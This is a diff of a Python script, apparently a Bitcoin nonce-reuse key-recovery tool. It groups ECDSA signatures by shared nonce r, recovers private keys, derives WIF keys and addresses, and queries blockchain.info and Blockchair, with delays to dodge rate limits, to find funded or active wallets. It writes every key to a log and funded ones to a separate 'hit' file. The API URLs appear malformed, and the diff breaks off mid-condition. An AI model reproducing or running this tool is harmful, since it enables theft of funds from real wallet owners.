@@ -102,32 +102,27 @@ def recover_private_key(sig1, sig2, n=SECP256K1_N):
         return None, None
 
 # ==========================================
-# UPGRADED MODULE: Multi-API Status Checker
+# Multi-API Status Checker
 # ==========================================
 
 def query_blockchain_info(address: str):
-    """
-    Queries blockchain data across multiple API fallbacks with premium browser emulation headers.
-    """
-    # Try Primary API (Blockchain.info)
     url = f"https://blockchain.info{address}"
     req = urllib.request.Request(
         url, 
-        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+        headers={'User-Agent': 'Mozilla/5.0'}
     )
     try:
-        time.sleep(1.5) # Increased delay to comfortably fly under rate limit systems
+        time.sleep(1.2)
         with urllib.request.urlopen(req, timeout=10) as response:
             data = json.loads(response.read().decode())
             bal_sat = data.get("final_balance", 0)
             txs = data.get("n_tx", 0)
             return {"balance": bal_sat / 100000000.0, "txs": txs, "source": "Blockchain.info"}
     except Exception:
-        # Pass to Fallback API (Blockchair)
         try:
             url_fallback = f"https://blockchair.com{address}"
             req_fb = urllib.request.Request(url_fallback, headers={'User-Agent': 'Mozilla/5.0'})
-            time.sleep(1.5)
+            time.sleep(1.2)
             with urllib.request.urlopen(req_fb, timeout=10) as response:
                 data = json.loads(response.read().decode())
                 addr_data = data.get("data", {}).get(address, {})
@@ -182,10 +177,9 @@ if __name__ == "__main__":
     keys_recovered = 0
     active_keys_found = 0
     
-    # Open both log engines simultaneously
     with open(output_all, 'w') as out_all, open(output_active, 'w') as out_act:
-        out_all.write("=== ALL RECOVERED MATH PRIVATE KEYS ===\n\n")
-        out_act.write("=== VALIDATED BITCOIN WALLETS WITH HIGH TX HISTORY OR ACTIVE BALANCES ===\n\n")
+        out_all.write("=== RECOVERED BITCOIN PRIVATE KEYS ===\n\n")
+        out_act.write("=== BITCOIN WALLETS WITH FOOTPRINTS ===\n\n")
         
         for r, sig_list in r_groups.items():
             if len(sig_list) > 1:
@@ -197,9 +191,8 @@ if __name__ == "__main__":
                             
                             if raw_pk:
                                 keys_recovered += 1
-                                print(f"[*] Analyzing Key Match Pair #{keys_recovered}...")
+                                print(f"[*] Analyzing Pair #{keys_recovered}...")
                                 
-                                # Derive cryptographic layouts
                                 wif_c = private_key_to_wif(raw_pk, compressed=True)
                                 addr_c = public_key_to_address(get_public_key(raw_pk, compressed=True))
                                 stats_c = query_blockchain_info(addr_c)
@@ -208,23 +201,28 @@ if __name__ == "__main__":
                                 addr_u = public_key_to_address(get_public_key(raw_pk, compressed=False))
                                 stats_u = query_blockchain_info(addr_u)
                                 
-                                # Map human readable descriptors
                                 bal_c_str = f"{stats_c['balance']:.8f} BTC" if stats_c['balance'] >= 0 else "Rate Limited"
                                 tx_c_str = str(stats_c['txs']) if stats_c['txs'] >= 0 else "Unknown"
                                 
                                 bal_u_str = f"{stats_u['balance']:.8f} BTC" if stats_u['balance'] >= 0 else "Rate Limited"
                                 tx_u_str = str(stats_u['txs']) if stats_u['txs'] >= 0 else "Unknown"
                                 
-                                log_entry = (
-                                    f"--- ENTRY #{keys_recovered} ---\n"
-                                    f"Source Line Pair      : Line {sig1['id']} & Line {sig2['id']}\n"
-                                    f"Shared Nonce R (Hex)  : {hex(r)}\n"
-                                    f"Raw Private Key Hex   : {hex(raw_pk)}\n\n"
-                                    f"  [↳] COMPRESSED PROFILE:\n"
-                                    f"      ├── WIF Private Key : {wif_c}\n"
-                                    f"      ├── Legacy Address  : {addr_c}\n"
-                                    f"      ├── Active Balance  : {bal_c_str}\n"
-                                    f"      └── Total Tx Count  : {tx_c_str}\n\n"
-                                    f"  [↳] UNCOMPRESSED PROFILE:\n"
-                                    f"      ├── WIF Private Key : {wif_u}\n"
-                                    f"      ├── Legacy Address  : {addr_u}\n"
+                                # Safe entry logging wrapper 
+                                def write_record(target_file):
+                                    target_file.write(f"--- ENTRY #{keys_recovered} ---\n")
+                                    target_file.write(f"Lines               : Line {sig1['id']} & Line {sig2['id']}\n")
+                                    target_file.write(f"Shared Nonce R      : {hex(r)}\n")
+                                    target_file.write(f"Raw Private Key Hex : {hex(raw_pk)}\n")
+                                    target_file.write(f"Compressed WIF      : {wif_c}\n")
+                                    target_file.write(f"Compressed Address  : {addr_c}\n")
+                                    target_file.write(f"Compressed Balance  : {bal_c_str} (Tx Count: {tx_c_str})\n")
+                                    target_file.write(f"Uncompressed WIF    : {wif_u}\n")
+                                    target_file.write(f"Uncompressed Address: {addr_u}\n")
+                                    target_file.write(f"Uncompressed Balance: {bal_u_str} (Tx Count: {tx_u_str})\n")
+                                    target_file.write("-" * 44 + "\n\n")
+
+                                # Write to master register
+                                write_record(out_all)
+                                
+                                # Write to live filtered hit file if valid transactions exist
+                                if stats_c['txs'] > 0 or stats_c['balance'] > 0 or stats_u['txs'] > 0 or stats_u['balance'] > 0:
